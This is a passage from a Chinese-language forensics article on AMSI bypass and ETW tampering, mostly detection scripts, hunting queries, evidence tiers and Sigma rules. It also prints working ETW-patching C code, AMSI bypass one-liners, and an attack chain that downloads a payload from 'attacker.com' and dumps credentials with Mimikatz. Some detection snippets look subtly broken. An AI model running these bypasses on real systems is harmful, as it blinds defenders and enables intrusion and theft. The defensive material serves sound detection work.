GUID providerGuid = /* Sysmon Provider GUID */;
EnableTraceEx2(hSession, &providerGuid,
    EVENT_CONTROL_CODE_DISABLE_PROVIDER,
    0, 0, 0, 0, NULL);
```

### 取证特征（Event ID 4/10/11、ETW Session 异常）

**Event ID 4（日志清除）**：

```xml
<Event>
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>4</EventID>
    <TimeCreated SystemTime="2026-06-25T10:30:00.000Z" />
  </System>
  <EventData>
    <Data Name="RuleName"></Data>
    <Data Name="Configuration">ProcessCreate=true NetworkConnection=true</Data>
    <Data Name="UtcTime">2026-06-25 10:30:00.000</Data>
  </EventData>
</Event>
```

**Event ID 10/11 的缺失**：

正常运行时应持续产生 Event ID 10（进程访问）和 Event ID 11（文件创建）事件。如果这些事件突然中断，说明 ETW Session 可能被禁用。

**ETW Session 异常特征**：

- 系统中 ETW Session 数量异常减少
- `logman query -ets` 输出中缺少已知的安全相关 Session
- Windows 事件日志中出现 Event ID 2（Provider 已卸载）或 Event ID 6（Session 停止）

### 检测方法

**方法一：ETW Session 完整性审计**

```powershell
logman query -ets 2>&1 | Select-String -Pattern "EventLog|Sysmon|WDIContext|DiagLog|NetCore"
```

**方法二：Sysmon 配置完整性检查**

```powershell
$sysmonReg = Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Services\Sysmon\Parameters" -ErrorAction SilentlyContinue
if (-not $sysmonReg) {
    Write-Host "Sysmon registry key missing - Sysmon may be disabled" -ForegroundColor Red
} else {
    $config = $sysmonReg.EventFiltering
    Write-Host "Sysmon EventFiltering: $config"
}
```

**方法三：事件日志连续性检查**

```powershell
$recentEvents = Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-Sysmon/Operational'; 
    Id=1; 
    StartTime=(Get-Date).AddHours(-1)
} -ErrorAction SilentlyContinue
if ($recentEvents.Count -eq 0) {
    Write-Host "No recent Sysmon Event ID 1 - ETW may be disabled" -ForegroundColor Red
}
```

---

## 0x06 ETW 篡改技术 — Provider 过滤与补丁

### ETW Provider 过滤器修改

ETW Provider 支持基于 Level、Keyword、ProcessId、UserId 等维度的过滤。攻击者可以通过修改过滤器来排除特定进程的事件。

**过滤器修改方法**：

```c
// 修改 Provider 过滤条件，排除特定进程
TRACEHANDLE hSession = GetSessionHandle("EventLog-Security");
GUID providerGuid = /* 目标 Provider GUID */;

EVENT_FILTER_DESCRIPTOR filterDesc;
ULONG filterData[2] = {GetCurrentProcessId(), 0};
filterDesc.Ptr = (ULONG_PTR)filterData;
filterDesc.Size = sizeof(filterData);

EnableTraceEx2(hSession, &providerGuid,
    EVENT_CONTROL_CODE_ENABLE_PROVIDER,
    TRACE_LEVEL_INFORMATION, 0, 0, 0, &filterDesc);
```

**ProcessId 过滤**：只收集特定进程的事件，排除恶意进程

**Keyword 过滤**：禁用特定事件类别的关键字，减少事件输出

### EtwEventWrite 补丁（返回值篡改）

这是最常用的 ETW 篡改方法，与 AMSI 的 `AmsiScanBuffer` 补丁类似。

**补丁目标**：

- `ntdll!EtwEventWrite`：ETW 事件写入的核心函数
- `ntdll!EtwEventWriteEx`：扩展事件写入函数
- `ntdll!EtwEventWriteFull`：完整事件写入函数

**补丁方法**：

```c
#include <windows.h>
#include <stdio.h>

void PatchEtwEventWrite() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    
    DWORD oldProtect;
    VirtualProtect((LPVOID)pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    
    *(UCHAR*)pEtwEventWrite = 0xC3;
    
    VirtualProtect((LPVOID)pEtwEventWrite, 1, oldProtect, &oldProtect);
}
```

将 `EtwEventWrite` 函数入口修改为 `0xC3`（`ret`），使所有 ETW 事件写入调用直接返回，不写入任何事件。

**ETW 补丁特征字节**：

| 补丁方法 | 特征字节 | 说明 |
|---|---|---|
| `ret` 直接返回 | `C3` | 函数入口被替换为 ret |
| `xor eax, eax; ret` | `33 C0 C3` | 返回 S_OK |
| `mov eax, 0; ret` | `B8 00 00 00 00 C3` | 返回 S_OK |

### NtTraceEvent 系统调用钩子

更高级的攻击者会补丁更底层的 `NtTraceEvent` 系统调用，绕过用户态的所有 ETW 层。

**攻击原理**：

`EtwEventWrite` 最终会调用 `NtTraceEvent`（在 `ntdll.dll` 中的 Native API 包装函数），通过 `syscall` 指令进入内核。攻击者可以在用户态补丁 `NtTraceEvent`，使其在进入内核之前返回，彻底阻止 ETW 事件的产生。

**检测方法**：

检查 `NtTraceEvent` 的入口字节是否被修改：

```powershell
$hNtdll = Get-Module ntdll.dll
$pNtTraceEvent = GetProcAddress $hNtdll "NtTraceEvent"
$bytes = New-Object byte[] 8
[System.Runtime.InteropServices.Marshal]::Copy([IntPtr]$pNtTraceEvent, $bytes, 0, 8)
$hexStr = ($bytes | ForEach-Object { $_.ToString("X2") }) -join " "
Write-Host "NtTraceEvent entry: $hexStr"
if ($hexStr -match "^C3 |^C2 |^33 C0 C3") {
    Write-Host "WARNING: NtTraceEvent patched!" -ForegroundColor Red
}
```

### ETW Provider 黑名单

攻击者维护一个 ETW Provider 黑名单，在运行时依次禁用这些 Provider：

| Provider | GUID | 影响 |
|---|---|---|
| Microsoft-Windows-Threat-Intelligence | {0f217580-e04c-4830-b3a0-5080b77fc1ff} | 内核威胁检测 |
| Microsoft-Windows-PowerShell | {a0c1853b-5c40-4b15-8766-3cf1c58f985a} | PowerShell 事件 |
| Microsoft-Windows-WMI-Activity | {1418ef04-b0b4-4623-bf9e-53e62062ebf8} | WMI 操作 |
| Microsoft-Windows-Sysmon | {5770385f-c22a-43e0-bf4c-06f5698ffbd9} | Sysmon 事件 |
| Microsoft-Windows-WinRM | {06492e43-33ea-4de2-b461-644f6c608d4b} | WinRM 操作 |

### 取证特征（ETW 事件丢失、Provider 异常状态）

**事件丢失特征**：

- 特定 Event ID 类型的事件突然中断或数量骤降
- 事件日志中出现时间间隙（Gap），对应 ETW Session 被停止的时间段
- 不同安全产品的事件时间线不一致（部分产品通过 ETW 收集，部分通过其他方式）

**Provider 异常状态特征**：

- `logman query providers` 输出中 Provider 状态异常
- Provider 启用计数（EnableCount）为 0，但对应 Session 仍在运行
- Provider 的注册状态为"未注册"但 Windows 事件日志中仍有其历史事件

### 检测方法

**方法一：EtwEventWrite 入口字节检查**

```powershell
$hNtdll = Get-Module ntdll.dll
$etwFunctions = @("EtwEventWrite", "EtwEventWriteEx", "EtwEventWriteFull")
foreach ($func in $etwFunctions) {
    $addr = Get-ProcAddress $hNtdll $func
    if ($addr -ne [IntPtr]::Zero) {
        $bytes = New-Object byte[] 8
        [System.Runtime.InteropServices.Marshal]::Copy($addr, $bytes, 0, 8)
        $hexStr = ($bytes | ForEach-Object { $_.ToString("X2") }) -join " "
        Write-Host "$func entry: $hexStr"
    }
}
```

**方法二：Provider 启用状态检查**

```powershell
logman query providers | Select-String -Pattern "Microsoft-Windows-(Sysmon|PowerShell|Threat-Intelligence|WMI-Activity)"
```

---

## 0x07 AMSI 与 ETW 篡改的取证分析方法

### 内存取证检测 AMSI 补丁

内存取证是检测 AMSI 绕过最直接的方法。攻击者的补丁只存在于进程内存中，不修改磁盘上的 `amsi.dll` 文件。

**Volatility 3 检测方法**：

使用 Volatility 3 的 `windows.malfind` 插件检测可疑的内存区域：

```bash
vol3 -f memory.dump windows.malfind --pid <powershell_pid>
```

关注以下特征：

- 具有 `PAGE_EXECUTE_READWRITE`（0x40）保护属性的内存区域
- 内存区域内容包含已知的 AMSI 补丁字节模式
- 内存区域位于 `amsi.dll` 的映像范围内

**手动内存检测**：

```powershell
$proc = Get-Process powershell -ErrorAction SilentlyContinue
if ($proc) {
    $amsiModule = $proc.Modules | Where-Object { $_.ModuleName -eq "amsi.dll" }
    if ($amsiModule) {
        $baseAddr = $amsiModule.BaseAddress
        $size = $amsiModule.ModuleMemorySize
        Write-Host "AMSI DLL Base: $baseAddr Size: $size"
    }
}
```

### ETW Session 状态审计

**完整 ETW 审计流程**：

```powershell
Write-Host "=== ETW Session Status ===" -ForegroundColor Cyan
logman query -ets 2>&1 | Out-String | Write-Host

Write-Host "`n=== ETW Provider Status ===" -ForegroundColor Cyan
logman query providers 2>&1 | Out-String | Write-Host

Write-Host "`n=== Critical ETW Sessions Check ===" -ForegroundColor Cyan
$criticalSessions = @("EventLog-Security", "EventLog-System", "EventLog-Application", "DiagLog", "WDIContextLog")
$currentSessions = logman query -ets 2>&1 | Out-String
foreach ($session in $criticalSessions) {
    if ($currentSessions -match $session) {
        Write-Host "[OK] $session is running" -ForegroundColor Green
    } else {
        Write-Host "[MISSING] $session is NOT running" -ForegroundColor Red
    }
}
```

### 系统完整性校验

**PowerShell 系统文件完整性检查**：

```powershell
$criticalFiles = @(
    "C:\Windows\System32\amsi.dll",
    "C:\Windows\System32\ntdll.dll",
    "C:\Windows\System32\kernel32.dll",
    "C:\Windows\System32\wldp.dll",
    "C:\Windows\System32\clr.dll",
    "C:\Windows\System32\mscoree.dll"
)

foreach ($file in $criticalFiles) {
    if (Test-Path $file) {
        $hash = (Get-FileHash $file -Algorithm SHA256).Hash
        $size = (Get-Item $file).Length
        $lastWrite = (Get-Item $file).LastWriteTime
        Write-Host "$file"
        Write-Host "  Hash: $hash"
        Write-Host "  Size: $size"
        Write-Host "  LastWrite: $lastWrite"
    }
}
```

### 安全日志缺失检测

**日志覆盖度交叉验证**：

```powershell
$timeRange = (Get-Date).AddHours(-24)

$processEvents = Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688; StartTime=$timeRange} -ErrorAction SilentlyContinue
$psEvents = $processEvents | Where-Object { $_.Message -match 'powershell|pwsh' }

$scriptBlockEvents = Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-PowerShell/Operational'; 
    Id=4104; 
    StartTime=$timeRange
} -ErrorAction SilentlyContinue

Write-Host "PowerShell process creations (4688): $($psEvents.Count)"
Write-Host "ScriptBlock events (4104): $($scriptBlockEvents.Count)"

if ($psEvents.Count -gt 5 -and $scriptBlockEvents.Count -eq 0) {
    Write-Host "[ALERT] PowerShell executing without ScriptBlock logging - possible AMSI bypass + ETW tampering" -ForegroundColor Red
}
```

**安全日志连续性检查**：

```powershell
$securityEvents = Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624; StartTime=$timeRange} -ErrorAction SilentlyContinue
$timeGaps = @()
for ($i = 1; $i -lt $securityEvents.Count; $i++) {
    $gap = $securityEvents[$i-1].TimeCreated - $securityEvents[$i].TimeCreated
    if ($gap.TotalMinutes -gt 30) {
        $timeGaps += [PSCustomObject]@{
            StartTime = $securityEvents[$i].TimeCreated
            EndTime = $securityEvents[$i-1].TimeCreated
            GapMinutes = $gap.TotalMinutes
        }
    }
}
if ($timeGaps.Count -gt 0) {
    Write-Host "Security log gaps detected:" -ForegroundColor Red
    $timeGaps | Format-Table
}
```

### 异常系统调用检测

```powershell
$proc = Get-Process powershell -ErrorAction SilentlyContinue
if ($proc) {
    $handleCount = $proc.HandleCount
    $threadCount = $proc.Threads.Count
    Write-Host "PowerShell PID: $($proc.Id)"
    Write-Host "  Handles: $handleCount"
    Write-Host "  Threads: $threadCount"
    
    if ($handleCount -gt 500) {
        Write-Host "  [WARNING] Abnormally high handle count" -ForegroundColor Red
    }
    
    $moduleCount = $proc.Modules.Count
    Write-Host "  Loaded Modules: $moduleCount"
}
```

---

## 0x08 证据强度分层

### 确认恶意（Confirmation Level）

| 编号 | 证据类型 | 描述 | 置信度 |
|---|---|---|---|
| C-01 | amsi.dll 磁盘文件被替换 | 系统目录下的 `amsi.dll` 哈希与已知版本不匹配，或文件大小异常 | ★★★★★ |
| C-02 | AmsiScanBuffer 入口字节确认被补丁 | 通过内存取证工具确认 `AmsiScanBuffer` 函数入口被修改为 `ret` 指令 | ★★★★★ |
| C-03 | EtwEventWrite 入口字节确认被补丁 | 通过内存取证工具确认 `EtwEventWrite` 函数入口被修改为 `ret` 指令 | ★★★★★ |
| C-04 | Sysmon 被卸载或服务停止 | Sysmon 进程不存在，服务状态为 Stopped，且 Event ID 4 显示配置变更 | ★★★★★ |
| C-05 | ETW Session 被停止 | `logman query -ets` 确认安全相关 Session 不在运行，且 Event ID 2/6 存在 | ★★★★★ |

### 高度可疑（High Suspicion Level）

| 编号 | 证据类型 | 描述 | 置信度 |
|---|---|---|---|
| H-01 | AMSI 绕过代码出现在 Script Block 中 | Event ID 4104 中包含 `amsiInitFailed`、`AmsiUtils`、`VirtualProtect` 等关键词 | ★★★★☆ |
| H-02 | PowerShell 执行但无 Script Block 日志 | 4688 事件显示 PowerShell 启动，但 4104 事件缺失 | ★★★★☆ |
| H-03 | AMSI DLL 异常路径加载 | 进程加载了非系统目录的 `amsi.dll`（如 `%TEMP%`、用户目录） | ★★★★☆ |
| H-04 | ETW Provider 配置异常 | Sysmon EventFiltering 被修改，或 ETW Provider 启用计数为 0 | ★★★★☆ |
| H-05 | 多个安全 ETW Session 同时缺失 | `logman query -ets` 显示多个安全相关 Session 不在运行 | ★★★★☆ |
| H-06 | 内存中检测到 ETW 补丁字节模式 | 进程内存中 `ntdll!EtwEventWrite` 入口存在已知补丁字节特征 | ★★★★☆ |

### 需要关注（Attention Level）

| 编号 | 证据类型 | 描述 | 置信度 |
|---|---|---|---|
| A-01 | AMSI DLL 文件时间戳异常 | `amsi.dll` 的修改时间与系统更新时间不一致 | ★★★☆☆ |
| A-02 | 异常的 VirtualProtect 调用 | Sysmon Event ID 8/10 中出现对 `amsi.dll` 或 `ntdll.dll` 的内存保护属性修改 | ★★★☆☆ |
| A-03 | 可疑的 PowerShell 执行参数 | 使用 `-ExecutionPolicy Bypass`、`-WindowStyle Hidden`、`-NoProfile` 等参数组合 | ★★★☆☆ |
| A-04 | ETW Session 配置变更 | Event ID 4/11 中记录了 ETW Session 的配置变更，但未被停止 | ★★☆☆☆ |
| A-05 | 非标准路径的 ETW Provider 注册 | 在 `logman query providers` 中发现非系统路径的 Provider | ★★☆☆☆ |
| A-06 | PowerShell 日志级别降低 | Script Block Logging 的 Level 设置从 5（Verbose）降低为 0（Critical） | ★★☆☆☆ |

---

## 0x09 公开案例中的 AMSI/ETW 篡改

### 案例一：Cobalt Strike — AMSI 绕过 + ETW 禁用

**背景**：Cobalt Strike 是最广泛使用的商业渗透测试和 C2 框架。其公共 Aggressor 脚本库中包含多个 AMSI/ETW 绕过模块。

**攻击链**：

1. 攻击者通过钓鱼邮件触发 PowerShell 执行
2. PowerShell 在执行前先调用 AMSI 绕过代码（修改 `amsiInitFailed` 或补丁 `AmsiScanBuffer`）
3. 绕过 AMSI 后，下载 Cobalt Strike Beacon 并注入到合法进程中
4. Beacon 执行后立即补丁 `EtwEventWrite`，阻止 ETW 事件产生
5. 后续所有 C2 通信和横向移动操作在无 AMSI 扫描和 ETW 监控的环境下执行

**公开的 Cobalt Strike AMSI 绕过脚本**：

```powershell
$a=[Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$f.SetValue($null,[IntPtr]::Zero)
```

**取证要点**：

- 在 Event ID 4104 中搜索 `AmsiUtils`、`amsiInitFailed`、`NonPublic,Static` 关键词
- 检查 PowerShell 执行后是否有 Beacon 注入的进程创建事件
- 检查 ETW Session 是否在同一时间窗口被禁用
- 检查 `ntdll.dll` 中 `EtwEventWrite` 的内存字节

### 案例二：APT29 — Reflective DLL + ETW 篡改

**背景**：APT29（Cozy Bear/SolarWinds 攻击者）被多次记录使用高级 ETW 篡改技术。

**攻击特征**：

1. 使用 Reflective DLL Loading 将恶意代码加载到合法进程内存中
2. 在加载前先禁用目标进程的 ETW 监控
3. 使用 Process Hollowing 技术创建挂起的合法进程（如 `svchost.exe`）
4. 在目标进程的 ETW 初始化之前注入恶意代码
5. 利用 ETW Provider 过滤器排除特定进程的事件

**取证要点**：

- Sysmon Event ID 7（Image Load）中出现未签名的反射加载 DLL
- 内存中检测到具有 `MZ` 头但未映射到磁盘文件的可疑内存区域
- `svchost.exe` 进程的模块列表异常，包含非系统目录的 DLL
- ETW-TI Provider 事件突然中断，但系统中其他 ETW Session 正常运行

### 案例三：恶意 PowerShell 攻击链 — AMSI 绕过

**背景**：在典型的 PowerShell 攻击链中，AMSI 绕过是"必须首先完成"的步骤。

**典型攻击链**：

```powershell
# 第一步：AMSI 绕过
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 第二步：ETW 补丁
$etw=[System.Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance')

# 第三步：下载执行
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/beacon.ps1')

# 第四步：凭据窃取
Invoke-Mimikatz -DumpCreds

# 第五步：横向移动
Invoke-Command -ComputerName DC01 -ScriptBlock { ... }
```

**取证要点**：

- 在 4104 事件中搜索攻击链的各个阶段
- 检查 4104 事件的时间分布，是否存在脚本块记录突然中断的时间点
- 检查 Event ID 4688 中 PowerShell 的启动参数（是否包含 `-ExecutionPolicy Bypass`）
- 检查后续的网络连接事件（Event ID 3）是否指向已知的 C2 IP/域名

---

## 0x10 AMSI/ETW 篡改检测自动化与狩猎

### PowerShell 完整性检测脚本

```powershell
function Test-AMSIIntegrity {
    $results = @()
    
    $amsiPath = "C:\Windows\System32\amsi.dll"
    if (Test-Path $amsiPath) {
        $hash = (Get-FileHash $amsiPath -Algorithm SHA256).Hash
        $size = (Get-Item $amsiPath).Length
        $results += [PSCustomObject]@{
            Check = "AMSI DLL File Hash"
            Value = $hash
            Status = if ($size -lt 100000 -or $size -gt 500000) { "SUSPICIOUS" } else { "OK" }
        }
    }
    
    $psProcesses = Get-Process powershell, pwsh -ErrorAction SilentlyContinue
    foreach ($proc in $psProcesses) {
        $amsiModule = $proc.Modules | Where-Object { $_.ModuleName -eq "amsi.dll" }
        if ($amsiModule) {
            $results += [PSCustomObject]@{
                Check = "AMSI Module Loaded in PID $($proc.Id)"
                Value = "Base: $($amsiModule.BaseAddress)"
                Status = "INFO"
            }
        }
    }
    
    $sysProcesses = Get-Process lsass, MsSense, SenseIR -ErrorAction SilentlyContinue
    foreach ($proc in $sysProcesses) {
        $handleCount = $proc.HandleCount
        $results += [PSCustomObject]@{
            Check = "Security Process $($proc.Name) Handle Count"
            Value = $handleCount
            Status = if ($handleCount -lt 50) { "SUSPICIOUS" } else { "OK" }
        }
    }
    
    return $results
}

Test-AMSIIntegrity | Format-Table -AutoSize
```

### ETW Session 监控脚本

```powershell
function Get-ETWHealthStatus {
    $status = @()
    
    $criticalSessions = @(
        "EventLog-Security",
        "EventLog-System",
        "EventLog-Application",
        "WDIContextLog",
        "DiagLog",
        "EventLog-Microsoft-Windows-PowerShell/Operational"
    )
    
    $currentSessions = logman query -ets 2>&1 | Out-String
    
    foreach ($session in $criticalSessions) {
        $found = $currentSessions -match $session
        $status += [PSCustomObject]@{
            Session = $session
            Running = if ($found) { "Yes" } else { "NO" }
            Severity = if ($found) { "OK" } else { "CRITICAL" }
        }
    }
    
    $sysmonService = Get-Service Sysmon64, Sysmon -ErrorAction SilentlyContinue
    $sysmonRunning = $sysmonService | Where-Object { $_.Status -eq "Running" }
    $status += [PSCustomObject]@{
        Session = "Sysmon Service"
        Running = if ($sysmonRunning) { "Yes" } else { "NO" }
        Severity = if ($sysmonRunning) { "OK" } else { "CRITICAL" }
    }
    
    return $status
}

Get-ETWHealthStatus | Format-Table -AutoSize
```

### 事件日志狩猎查询（SQL/KQL）

**KQL 查询：检测 AMSI 绕过脚本执行**

```kql
SecurityEvent
| where EventID == 4688
| where NewProcessName contains "powershell"
| where ProcessCommandLine contains "amsiInitFailed" or 
      ProcessCommandLine contains "AmsiUtils" or
      ProcessCommandLine contains "VirtualProtect" or
      ProcessCommandLine contains "NonPublic,Static"
| project TimeCreated, Account, NewProcessName, ProcessCommandLine, CreatorProcessName
```

**KQL 查询：检测 Script Block 日志缺失**

```kql
let timeRange = 24h;
let psExecutions = SecurityEvent
| where EventID == 4688
| where NewProcessName has_any ("powershell.exe", "pwsh.exe")
| where TimeCreated > ago(timeRange)
| count;
let scriptBlocks = SecurityEvent
| where EventID == 4104
| where TimeCreated > ago(timeRange)
| count;
psExecutions
| extend ScriptBlockCount = scriptBlocks
| where ScriptBlockCount == 0 and psExecutions > 5
| extend Assessment = "PowerShell executing without ScriptBlock logging"
```

**SQL 查询（Windows 事件日志转发场景）**：

```sql
SELECT 
    TimeGenerated,
    EventID,
    EXE AS ProcessName,
    CommandLine,
    ParentProcessName
FROM WindowsEventLog
WHERE SourceName = 'Microsoft-Windows-Sysmon/Operational'
    AND EventID IN (1, 7, 8, 10)
    AND (CommandLine LIKE '%amsi%' OR CommandLine LIKE '%etw%')
    AND TimeGenerated > DATEADD(hour, -24, GETDATE())
ORDER BY TimeGenerated DESC
```

**KQL 查询：检测 ETW Session 异常**

```kql
SecurityEvent
| where EventID in (4, 10, 11)
| where SourceName == "Microsoft-Windows-Sysmon"
| where Message contains "configuration" or Message contains "state"
| project TimeCreated, EventID, Message
| sort by TimeCreated desc
```

### Sigma 检测规则（≥4 条）

**规则一：检测 PowerShell AMSI 绕过尝试**

```yaml
title: AMSI Bypass Attempt in PowerShell
id: amsi-bypass-ps-001
status: experimental
description: 检测 PowerShell 中已知的 AMSI 绕过代码模式
references:
  - https://attack.mitre.org/techniques/T1562/001/
author: DFIR Team
date: 2026/06/25
tags:
  - attack.defense_evasion
  - attack.t1562.001
logsource:
  product: windows
  service: powershell-classic
detection:
  selection:
    EventID: 4104
  selection_amsi_init:
    Message|contains:
      - 'amsiInitFailed'
      - 'AmsiUtils'
      - 'System.Management.Automation.AmsiUtils'
  selection_amsi_field:
    Message|contains:
      - 'GetField('
      - 'NonPublic,Static'
      - 'SetValue($null'
  condition: selection and (selection_amsi_init or selection_amsi_field)
level: high
```

**规则二：检测 ETW 事件写入函数补丁**

```yaml
title: ETW EventWrite Function Patching
id: etw-patch-001
status: experimental
description: 检测通过内存补丁禁用 ETW 事件追踪的行为
references:
  - https://attack.mitre.org/techniques/T1562/006/
author: DFIR Team
date: 2026/06/25
tags:
  - attack.defense_evasion
  - attack.t1562.006
logsource:
  product: windows
  category: process_creation
detection:
  selection_cmd:
    EventID: 1
    Image|endswith: '\rundll32.exe'
    CommandLine|contains|all:
      - 'EtwEventWrite'
      - 'VirtualProtect'
  selection_cmd2:
    EventID: 4688
    NewProcessName|endswith: '\powershell.exe'
    ProcessCommandLine|contains:
      - 'EtwEventWrite'
      - 'EventProvider'
      - 'm_enabled'
  condition: selection_cmd or selection_cmd2
level: high
```

**规则三：检测 ETW Session 停止操作**

```yaml
title: ETW Session Stop Operation
id: etw-session-stop-001
status: experimental
description: 检测通过 logman 或 API 停止安全相关 ETW Session 的行为
references:
  - https://attack.mitre.org/techniques/T1562/006/
author: DFIR Team
date: 2026/06/25
tags:
  - attack.defense_evasion
  - attack.t1562.006
logsource:
  product: windows
  category: process_creation
detection:
  selection_logman:
    EventID: 1
    Image|endswith: '\logman.exe'
    CommandLine|contains:
      - 'stop'
      - '-ets'
  selection_logman_target:
    CommandLine|contains:
      - 'EventLog-Security'
      - 'EventLog-System'
      - 'WDIContextLog'
      - 'DiagLog'
      - 'Sysmon'
  selection_api:
    EventID: 4688
    ProcessCommandLine|contains:
      - 'ControlTrace'
      - 'EVENT_TRACE_CONTROL_STOP'
  condition: (selection_logman and selection_logman_target) or selection_api
level: high
```

**规则四：检测 ETW Provider 禁用操作**

```yaml
title: ETW Provider Disabled Operation
id: etw-provider-disable-001
status: experimental
description: 检测通过 API 或命令行禁用 ETW Provider 的行为
references:
  - https://attack.mitre.org/techniques/T1562/006/
author: DFIR Team
date: 2026/06/25
tags:
  - attack.defense_evasion
  - attack.t1562.006
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    EventID: 4688
    ProcessCommandLine|contains:
      - 'EnableTraceEx2'
      - 'EVENT_CONTROL_CODE_DISABLE_PROVIDER'
  selection_provider:
    ProcessCommandLine|contains:
      - 'Microsoft-Windows-Sysmon'
      - 'Microsoft-Windows-PowerShell'
      - 'Microsoft-Windows-Threat-Intelligence'
      - 'Microsoft-Windows-WMI-Activity'
  condition: selection and selection_provider
level: high
```

**规则五：检测 PowerShell Script Block 日志被禁用**

```yaml
title: PowerShell ScriptBlock Logging Disabled
id: ps-sb-logging-disabled-001
status: experimental
description: 检测通过注册表禁用 PowerShell Script Block Logging 的行为
references:
  - https://attack.mitre.org/techniques/T1562/001/
author: DFIR Team
date: 2026/06/25
tags:
  - attack.defense_evasion
  - attack.t1562.001
logsource:
  product: windows
  category: registry_set
detection:
  selection:
    EventID: 13
    TargetObject|contains: '\PowerShell\ScriptBlockLogging\'
    TargetObject|endswith: '\EnableScriptBlockLogging'
    Details: 'DWORD (0x00000000)'
  selection2:
    EventID: 13
    TargetObject|contains: '\PowerShell\ScriptBlockLogging\'
    TargetObject|endswith: '\EnableScriptBlockInvocationLogging'
    Details: 'DWORD (0x00000000)'
  condition: selection or selection2
level: high
```

**规则六：检测 amsi.dll 异常落地**

```yaml
title: Suspicious AMSI DLL File Dropped
id: amsi-dll-drop-001
status: experimental
description: 检测在非系统目录下落地的可疑 amsi.dll 文件
references:
  - https://attack.mitre.org/techniques/T1574/002/
author: DFIR Team
date: 2026/06/25
tags:
  - attack.defense_evasion
  - attack.t1574.002
logsource:
  product: windows
  category: file_event
detection:
  selection:
    EventID: 11
    TargetFilename|endswith: '\amsi.dll'
  filter_system:
    TargetFilename|startswith: 'C:\Windows\System32\'
    TargetFilename|startswith: 'C:\Windows\SysWOW64\'
  condition: selection and not filter_system
level: high
```

---

## 0x11 参考资料

1. Microsoft. "Antimalware Scan Interface (AMSI)" - https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal
2. Microsoft. "Event Tracing for Windows (ETW)" - https://learn.microsoft.com/en-us/windows/win32/etw/event-tracing-portal
3. MITRE ATT&CK. "T1562.001 - Impair Defenses: Disable or Modify Tools" - https://attack.mitre.org/techniques/T1562/001/
4. MITRE ATT&CK. "T1562.006 - Impair Defenses: Indicator Blocking" - https://attack.mitre.org/techniques/T1562/006/
5. MITRE ATT&CK. "T1620 - Reflective Code Loading" - https://attack.mitre.org/techniques/T1620/
6. MITRE ATT&CK. "T1140 - Deobfuscate/Decode Files or Information" - https://attack.mitre.org/techniques/T1140/
7. Unit 42. "Off the Beaten Path: Recent Unusual Malware" - https://unit42.paloaltonetworks.com/unusual-malware/
8. Elastic Security Labs. "Doubling Down: Detecting In-Memory Threats with Kernel ETW Call Stacks" - https://www.elastic.co/security-labs/doubling-down-etw-callstacks
9. Elastic Security Labs. "Elastic Security Labs steps through the r77 rootkit" - https://www.elastic.co/security-labs/elastic-security-labs-steps-through-the-r77-rootkit
10. Matt Graebers. "AMSInternals" - https://amsiintrospection.com/
11. Microsoft. "Script Block Logging" - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging?view=powershell-7.4
12. Trail of Bits. "AMSI Failures" - https://blog.trailofbits.com/2024/12/19/amsi-failures/
13. Red Canary. "2025 Threat Detection Report" - https://redcanary.com/threat-detection-report/
14. Sophos. "Unprotected ETW: How attackers tamper with Windows telemetry" - https://www.sophos.com/en-us/research-content/2024/01/unprotected-etw.html
